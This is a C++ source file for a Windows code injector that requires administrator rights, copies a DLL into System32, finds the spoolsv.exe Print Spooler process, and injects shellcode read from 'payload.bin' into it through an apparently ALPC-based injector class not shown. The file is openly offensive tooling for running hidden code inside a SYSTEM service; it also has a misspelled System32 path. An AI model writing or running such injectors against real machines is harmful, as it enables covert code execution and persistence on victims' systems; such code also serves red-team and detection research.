#pragma once

#include <iostream>
#include <vector>
#include <optional>
#include <fstream>
#include <windows.h>
#include <tlhelp32.h>
#include <functional>
#include <Psapi.h>
#include <nttpp.h>
#include "ALPCInjector.hpp"
#include <spdlog/spdlog.h>

namespace InjectorConstants {
    const int ProcessNotFoundErrorCode = 3;
}

/**
 * The function "ReadPayload" reads the contents of a binary file and returns them as a vector of
 * unsigned characters.
 * 
 * @param filePath The `filePath` parameter is a `std::string` that represents the path to the file
 * that needs to be read.
 * 
 * @return The function `ReadPayload` returns a `std::vector<unsigned char>`.
 */
std::vector<unsigned char> ReadPayload(const std::string& filePath) {
    std::ifstream inputFile(filePath, std::ios::binary);

    if (!inputFile.is_open()) {
        std::cerr << "Error opening file: " << filePath << "\n";
        // Handle the error appropriately
        return {};
    }

    return { std::istreambuf_iterator<char>{inputFile}, {} };
}

/**
 * The function `GetProcessIdByExecutableName` retrieves the process ID of a running process based on
 * its executable name.
 * 
 * @param targetExecutable The targetExecutable parameter is a string that represents the name of the
 * executable file for which we want to retrieve the process ID.
 * 
 * @return a DWORD value, which represents the process ID of the target executable.
 */
DWORD GetProcessIdByExecutableName(const std::string& targetExecutable) {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (snapshot == INVALID_HANDLE_VALUE) {
        std::cerr << "Error creating process snapshot: " << GetLastError() << "\n";
        return 0;
    }

    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(snapshot, &processEntry)) {
        do {
            if (strcmp(processEntry.szExeFile, targetExecutable.c_str()) == 0) {
                CloseHandle(snapshot);
                return processEntry.th32ProcessID;
            }
        } while (Process32Next(snapshot, &processEntry));
    }

    CloseHandle(snapshot);
    return 0;
}

/**
 * The function checks if the current process is running with elevated privileges.
 * 
 * @return a boolean value indicating whether the current process is elevated or not.
 */
bool IsCurrentProcessElevated() {
    HANDLE hToken;
    BOOL bResult = FALSE;
    TOKEN_ELEVATION te;
    DWORD dwSize;

    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        if (GetTokenInformation(hToken, TokenElevation, &te, sizeof(TOKEN_ELEVATION), &dwSize)) {
            bResult = te.TokenIsElevated;
        }
        CloseHandle(hToken);
    }

    return bResult;
}
/*
    Another solutions has to be found in future.
    Currently payload calls LoadLibrary without any absolute path, so it loads it straight from C:\Windows\System32
    A posible solutions is writing a dll path straight from injector somewhere in mmemory and use that in payload.
*/
void MoveFileToSystem32(){
    CopyFileA("stub.dll", "C:\\Windowws\\System32\\test.dll", FALSE);
}
int main(int argc, char* argv[]) {

    spdlog::set_level(spdlog::level::debug);
    
    if (!IsCurrentProcessElevated()) {
        std::cout << "Please run injector with administrator rights!\n";
        return 1;
    }
    MoveFileToSystem32();


    const auto targetPid = GetProcessIdByExecutableName("spoolsv.exe");

    if (targetPid == 0) {
        std::cout << "Spoolsv.exe couldn't be found!" << std::endl;
        return InjectorConstants::ProcessNotFoundErrorCode;
    }

    ALPCInjector injector;

    const auto payload = ReadPayload("payload.bin");

    std::cout << "Payload size " << payload.size() << std::endl;

    const InjectionResult result = injector.Inject(targetPid, payload);
    std::cout << "InjectionResult " << (int)result << std::endl;
    return 0;
}
